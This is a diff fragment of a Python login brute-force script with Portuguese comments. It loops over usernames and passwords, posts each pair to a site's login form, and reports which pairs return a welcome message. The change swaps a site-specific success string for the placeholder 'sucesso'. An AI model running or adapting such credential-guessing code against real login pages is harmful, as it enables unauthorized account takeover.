@@ -20,7 +20,7 @@ def requisicao():
                 'senha':senhas #aqui você deve trocar senha pelo parâmetro da senha 
             }
             req = requests.post(url,data=parametros)
-            if "Bem-vindo à nova página!" in req.text: #aqui e crucial, você deve modificar "sucesso" por alguma mensagem de boas vindas que o site imprime quando você faz login corretamente.
+            if "sucesso" in req.text: #aqui e crucial, você deve modificar "sucesso" por alguma mensagem de boas vindas que o site imprime quando você faz login corretamente.
                 print (f" sucesso {user} - {senhas}")
             else:
                 print (f"falha {user} - {senhas} X")
